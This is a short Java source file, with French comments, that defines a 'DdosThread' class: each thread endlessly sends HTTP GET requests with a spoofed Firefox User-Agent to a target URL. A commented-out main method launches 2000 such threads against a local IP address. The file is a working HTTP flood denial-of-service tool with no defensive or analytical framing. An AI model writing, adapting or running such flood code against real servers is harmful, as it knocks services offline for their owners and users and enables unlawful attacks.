/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package menu;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
/**
 *
 * @author gallagher
 */
class DdosThread extends Thread  {
//    public static void main(String[] args) throws Exception {
//        String targetUrl = "http://192.168.8.103"; // Remplacez ceci par l'URL cible
//        for (int i = 0; i < 2000; i++) {
//            DdosThread thread = new DdosThread(targetUrl);
//            thread.start();
//        }
//    }

   

        private final AtomicBoolean running = new AtomicBoolean(true);
        private final URL url;
        private final String param;

        public DdosThread(String targetUrl) throws Exception {
            url = new URL(targetUrl);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                    // Gestion des exceptions ici
                }
            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", url.getHost());
            connection.setRequestProperty("User-Agent",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", String.valueOf(param.getBytes().length));
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        }
    
}
